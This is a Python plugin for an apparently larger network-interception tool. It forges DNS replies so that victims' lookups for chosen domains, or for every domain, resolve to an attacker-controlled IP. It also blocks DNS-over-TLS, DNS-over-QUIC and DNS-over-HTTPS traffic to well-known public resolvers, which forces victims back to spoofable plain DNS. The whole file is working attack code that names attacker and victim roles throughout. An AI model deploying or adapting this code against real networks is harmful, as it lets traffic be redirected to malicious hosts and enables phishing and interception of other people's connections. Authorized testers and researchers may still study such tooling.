from .base import PacketPlugin
from scapy.all import IP, UDP, TCP, DNS, DNSQR, DNSRR, Ether, sendp
import socket
from urllib.parse import urlparse

class DnsSpoofPlugin(PacketPlugin):
    def __init__(self):
        self.dns_domain = None
        self.dns_ip = None
        self.force_plain_dns = False
        
    def register_args(self, parser):
        group = parser.add_argument_group("DNS Spoofing")
        group.add_argument("--dns-spoof-domain", help="Domain to spoof (substring match) or '*' for all")
        group.add_argument("--dns-spoof-ip", help="IP to return in DNS response (default: attacker IP)")
        group.add_argument("--dns-redirect-url", help="Resolve this URL's domain and use its IP for DNS spoofing")
        group.add_argument("--force-plain-dns", action="store_true", help="Block UDP/443 and TCP/853 to force simple DNS fallback")

    def configure(self, args):
        self.dns_domain = args.dns_spoof_domain
        self.force_plain_dns = args.force_plain_dns
        
        # IP resolution logic
        dns_spoof_ip = args.dns_spoof_ip
        if args.dns_redirect_url:
            try:
                parsed = urlparse(args.dns_redirect_url if "//" in args.dns_redirect_url else f"//{args.dns_redirect_url}")
                target_host = parsed.hostname
                if not target_host:
                    target_host = args.dns_redirect_url.split("/")[0]
                
                print(f"[*] Resolving target URL domain: {target_host}...")
                dns_spoof_ip = socket.gethostbyname(target_host)
                print(f"[+] Resolved {target_host} -> {dns_spoof_ip}")
                print("[!] WARNING: Modern browsers may reject traffic due to Host header / SNI mismatch!")
            except Exception as e:
                print(f"[-] Failed to resolve URL {args.dns_redirect_url}: {e}")
                # We don't exit here to avoid killing the main tool, just warn
        elif args.dns_spoof_domain and not dns_spoof_ip:
            # Default to attacker's IP
             try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                dns_spoof_ip = s.getsockname()[0]
                s.close()
             except:
                 dns_spoof_ip = "127.0.0.1"

        self.dns_ip = dns_spoof_ip

    def _send_dns_reply(self, victim_pkt: IP, spoof_ip: str, ctx: dict) -> None:
        try:
            v_ip = victim_pkt[IP]
            v_udp = victim_pkt[UDP]
            v_dns = victim_pkt[DNS]

            if v_dns.qr != 0 or v_dns.opcode != 0:
                return

            qname = v_dns.qd.qname
            
            dns_resp = DNS(
                id=v_dns.id,
                qr=1, # Response
                aa=1, # Authoritative
                rd=v_dns.rd,
                ra=0, 
                z=0,
                rcode=0,
                qd=v_dns.qd, 
                an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=60, rdata=spoof_ip)
            )

            spoofed_pkt = (
                Ether(src=ctx["attacker_mac"], dst=ctx["victim_mac"]) /
                IP(src=v_ip.dst, dst=v_ip.src) /
                UDP(sport=v_udp.dport, dport=v_udp.sport) /
                dns_resp
            )
            
            sendp(spoofed_pkt, iface=ctx["iface"], verbose=False)
            print(f"[DNS] Spoofed {qname.decode()} -> {spoof_ip}")

        except Exception as e:
            print(f"[!] dns spoof exception: {e}")

    def process_packet(self, ip_pkt: IP, ctx: dict) -> bool:
        # Force Plain DNS logic
        if self.force_plain_dns:
             if ip_pkt.haslayer(UDP):
                if ip_pkt[UDP].dport in [443, 853]:
                    print(f"[DROP] Blocking UDP/{ip_pkt[UDP].dport} (QUIC/DoQ) to force plain DNS")
                    return True
            
             if ip_pkt.haslayer(TCP):
                 if ip_pkt[TCP].dport == 853:
                     print(f"[DROP] Blocking TCP/853 (DoT) to force plain DNS")
                     return True
                 
                 # Block TCP 443 (DoH) to Known Public DNS Providers
                 known_dns_ips = {
                    "8.8.8.8", "8.8.4.4",          # Google
                    "1.1.1.1", "1.0.0.1",          # Cloudflare
                    "9.9.9.9", "149.112.112.112",  # Quad9
                    "208.67.222.222", "208.67.220.220" # OpenDNS
                 }
                 if ip_pkt[TCP].dport == 443 and ip_pkt.dst in known_dns_ips:
                     print(f"[DROP] Blocking TCP/443 to {ip_pkt.dst} (Likely DoH) to force plain DNS")
                     return True

        # DNS Spoofing Logic
        if self.dns_ip and ip_pkt.haslayer(UDP) and ip_pkt[UDP].dport == 53 and ip_pkt.haslayer(DNS):
            dns_layer = ip_pkt[DNS]
            if dns_layer.qr == 0 and dns_layer.qd: # Query
                qname = dns_layer.qd.qname.decode()
                if self.dns_domain == "*" or qname.rstrip(".").endswith(self.dns_domain):
                     self._send_dns_reply(ip_pkt, self.dns_ip, ctx)
                     return True
        
        return False
